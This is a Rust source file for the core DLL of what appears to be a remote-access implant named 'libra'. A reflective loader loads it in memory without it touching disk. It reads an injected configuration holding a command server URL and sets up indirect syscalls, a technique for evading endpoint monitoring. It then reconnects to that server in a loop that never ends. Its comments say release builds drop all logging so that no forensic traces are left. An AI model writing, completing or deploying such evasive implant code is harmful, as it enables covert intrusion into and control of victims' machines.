//! Core DLL — contains all agent functionality.
//! Loaded reflectively by the loader, never touches disk.

use libra_common::models::InjectedConfig;

// ── File-based logging using raw Windows API (no CRT dependency) ─────

#[cfg(target_os = "windows")]
mod winlog {
    extern "system" {
        fn CreateFileA(
            lpFileName: *const u8,
            dwDesiredAccess: u32,
            dwShareMode: u32,
            lpSecurityAttributes: *mut core::ffi::c_void,
            dwCreationDisposition: u32,
            dwFlagsAndAttributes: u32,
            hTemplateFile: *mut core::ffi::c_void,
        ) -> *mut core::ffi::c_void;
        fn WriteFile(
            hFile: *mut core::ffi::c_void,
            lpBuffer: *const u8,
            nNumberOfBytesToWrite: u32,
            lpNumberOfBytesWritten: *mut u32,
            lpOverlapped: *mut core::ffi::c_void,
        ) -> i32;
        fn CloseHandle(hObject: *mut core::ffi::c_void) -> i32;
    }

    const GENERIC_WRITE: u32 = 0x40000000;
    const FILE_SHARE_READ: u32 = 0x00000001;
    const CREATE_ALWAYS: u32 = 2;
    const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;
    const INVALID_HANDLE_VALUE: *mut core::ffi::c_void = -1isize as *mut core::ffi::c_void;

    pub fn write_log(path: &str, msg: &str) {
        unsafe {
            let mut path_bytes: Vec<u8> = path.bytes().collect();
            path_bytes.push(0);
            let h = CreateFileA(
                path_bytes.as_ptr(),
                GENERIC_WRITE,
                FILE_SHARE_READ,
                core::ptr::null_mut(),
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                core::ptr::null_mut(),
            );
            if h == INVALID_HANDLE_VALUE {
                return;
            }
            let mut written: u32 = 0;
            let _ = WriteFile(
                h,
                msg.as_ptr(),
                msg.len() as u32,
                &mut written,
                core::ptr::null_mut(),
            );
            let _ = CloseHandle(h);
        }
    }

    #[allow(dead_code)]
    pub fn append_log(path: &str, msg: &str) {
        // For append, we use a simple approach: read existing + write new
        // But since we're using raw API, just use CREATE_ALWAYS for simplicity
        // In practice, each log line is a separate file or we accept overwrite
        write_log(path, msg);
    }
}

macro_rules! log {
    ($path:expr, $($arg:tt)*) => {{
        // Debug builds only: writing a plaintext log file to a public path is
        // an obvious forensic artifact, so release builds compile this away
        // entirely (no file, no stderr).
        if cfg!(debug_assertions) {
            let msg = format!($($arg)*);
            let full = format!("{}\n", msg);
            // Try winlog first, fall back to eprintln
            #[cfg(target_os = "windows")]
            winlog::write_log($path, &full);
            eprintln!("{}", msg);
            let _ = std::io::Write::flush(&mut std::io::stderr());
        }
    }};
}

#[cfg(debug_assertions)]
const LOG_FILE: &str = "C:\\Users\\Public\\core_debug.txt";
#[cfg(not(debug_assertions))]
const LOG_FILE: &str = "";

/// Entry point called by the reflective loader.
/// NEVER RETURNS — the loader waits for the process to exit.
///
/// # Safety
/// `config_ptr` must point to valid UTF-8 JSON of length `config_len`.
#[no_mangle]
pub unsafe extern "system" fn core_main(config_ptr: *const u8, config_len: usize) {
    // Immediate file log — doesn't depend on CRT (debug builds only)
    #[cfg(all(debug_assertions, target_os = "windows"))]
    winlog::write_log(LOG_FILE, "[core] core_main entered!\n");

    log!(
        LOG_FILE,
        "[core] core_main entered, ptr={:?}, len={}",
        config_ptr,
        config_len
    );

    // Parse config JSON from raw pointer
    let config_json = if config_ptr.is_null() || config_len == 0 {
        log!(LOG_FILE, "[core] ptr is null or len=0, using default");
        "{}"
    } else {
        match std::str::from_utf8(std::slice::from_raw_parts(config_ptr, config_len)) {
            Ok(s) => {
                log!(LOG_FILE, "[core] config JSON parsed OK ({} bytes)", s.len());
                s
            }
            Err(e) => {
                log!(LOG_FILE, "[core] UTF-8 error: {}", e);
                "{}"
            }
        }
    };

    log!(LOG_FILE, "[core] deserializing InjectedConfig...");
    let injected: InjectedConfig = match serde_json::from_str::<InjectedConfig>(config_json) {
        Ok(c) => {
            log!(
                LOG_FILE,
                "[core] InjectedConfig OK, server={}",
                c.server_url
            );
            c
        }
        Err(e) => {
            log!(
                LOG_FILE,
                "[core] FATAL: InjectedConfig deserialize failed: {}",
                e
            );
            log!(
                LOG_FILE,
                "[core] JSON was: {}",
                &config_json[..config_json.len().min(500)]
            );
            return;
        }
    };

    let args: Vec<String> = std::env::args().collect();
    log!(LOG_FILE, "[core] args={:?}", args);

    // Install panic hook so we can see panic messages (panic=abort kills silently).
    // Debug builds only — release must not write diagnostics anywhere.
    #[cfg(debug_assertions)]
    std::panic::set_hook(Box::new(|info| {
        let msg = format!("[core] PANIC: {}", info);
        eprintln!("{}", msg);
        let _ = std::io::Write::flush(&mut std::io::stderr());
        #[cfg(target_os = "windows")]
        winlog::write_log(LOG_FILE, &format!("{}\n", msg));
    }));

    // Phase 1: initialize the indirect-syscall table so downstream modules can
    // use libra-syscalls instead of direct ntdll FFI. Best-effort — a failure
    // is logged and must not abort agent startup.
    #[cfg(target_os = "windows")]
    {
        match libra_syscalls::init() {
            Ok(()) => log!(LOG_FILE, "[core] libra-syscalls ready (indirect syscall)"),
            Err(e) => log!(LOG_FILE, "[core] libra-syscalls init failed: {}", e),
        }
    }

    // Reconnect loop: if the engine disconnects or errors, retry after delay
    let mut iteration = 0u32;
    loop {
        iteration += 1;
        log!(LOG_FILE, "[core] loop iteration #{}", iteration);

        let cfg = libra_engine::config::ConfigManager::load(&args, Some(injected.clone()));
        log!(
            LOG_FILE,
            "[core] ConfigManager::load OK, server={}",
            cfg.server_url
        );

        log!(LOG_FILE, "[core] creating tokio runtime (multi_thread)...");
        let rt = match tokio::runtime::Builder::new_multi_thread()
            .enable_all()
            .build()
        {
            Ok(rt) => {
                log!(LOG_FILE, "[core] tokio runtime created");
                rt
            }
            Err(e) => {
                log!(LOG_FILE, "[core] tokio runtime failed: {}, sleeping 30s", e);
                std::thread::sleep(std::time::Duration::from_secs(30));
                continue;
            }
        };

        log!(LOG_FILE, "[core] entering engine.run()...");
        rt.block_on(async {
            let mut engine = libra_engine::engine::AgentEngine::new(cfg);
            let _ = engine.run().await;
        });
        log!(
            LOG_FILE,
            "[core] engine.run() returned, sleeping 5s before reconnect..."
        );

        // Engine returned (disconnect or error) — wait then reconnect
        std::thread::sleep(std::time::Duration::from_secs(5));
    }
}
